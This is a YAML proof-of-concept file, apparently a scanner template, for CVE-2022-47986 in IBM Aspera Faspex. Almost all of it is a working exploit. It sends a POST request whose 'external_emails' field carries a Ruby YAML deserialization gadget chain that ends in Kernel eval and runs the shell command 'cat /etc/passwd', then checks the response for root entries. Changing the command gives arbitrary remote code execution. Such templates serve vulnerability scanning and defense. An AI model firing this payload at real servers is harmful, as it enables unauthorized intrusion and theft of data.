name: yaml-poc-ibm-aspera_faspex-logical-CVE-2022-47986
binding: 8cde9ca2-9c65-45f8-9ef4-45904ffdf9a7
detail:
    author: jiapeng.han
    links:
        - http://packetstormsecurity.com/files/171772/IBM-Aspera-Faspex-4.4.1-YAML-Deserialization.html
        - https://exchange.xforce.ibmcloud.com/vulnerabilities/243512
        - https://www.ibm.com/docs/en/aspera-faspex/4.4?topic=notes-release-aspera-faspex-442
        - https://www.ibm.com/support/pages/node/6952319
    vulnerability:
        id: f537f242-873b-4278-bb1e-f1d0629ecd82
        level: critical
    warning: Harmless
transport: http
set:
    randStr: randomLowercase(4)
    randStr2: randomLowercase(8)
    uuid: string("d7cb6601-6db9-43aa-8e6b-dfb4768647ec")
    cmd: string("cat /etc/passwd")
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /aspera/faspex/package_relay/relay_package
            headers:
                Content-Type: application/json
            body: '{"package_file_list": ["/"], "external_emails": "\n---\n- !ruby/object:Gem::Installer\n    i: x\n- !ruby/object:Gem::SpecFetcher\n    i: y\n- !ruby/object:Gem::Requirement\n  requirements:\n    !ruby/object:Gem::Package::TarReader\n    io: &1 !ruby/object:Net::BufferedIO\n      io: &1 !ruby/object:Gem::Package::TarReader::Entry\n         read: 0\n         header: \"pew\"\n      debug_output: &1 !ruby/object:Net::WriteAdapter\n         socket: &1 !ruby/object:PrettyPrint\n             output: !ruby/object:Net::WriteAdapter\n                 socket: &1 !ruby/module \"Kernel\"\n                 method_id: :eval\n             newline: \"throw `{{cmd}}`\"\n             buffer: {}\n             group_stack:\n              - !ruby/object:PrettyPrint::Group\n                break: true\n         method_id: :breakable\n", "package_name": "{{randStr}}", "package_note": "{{randstr}}", "original_sender_name": "{{randstr}}", "package_uuid": "{{uuid}}", "metadata_human_readable": "Yes", "forward": "pew", "metadata_json": "{}", "delivery_uuid": "{{uuid}}", "delivery_sender_name": "{{randStr2}}", "delivery_title": "{{randStr}}", "delivery_note": "{{randStr}}", "delete_after_download": true, "delete_after_download_condition": "IDK"}'
        expression: response.status == 500 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
expression: r0()
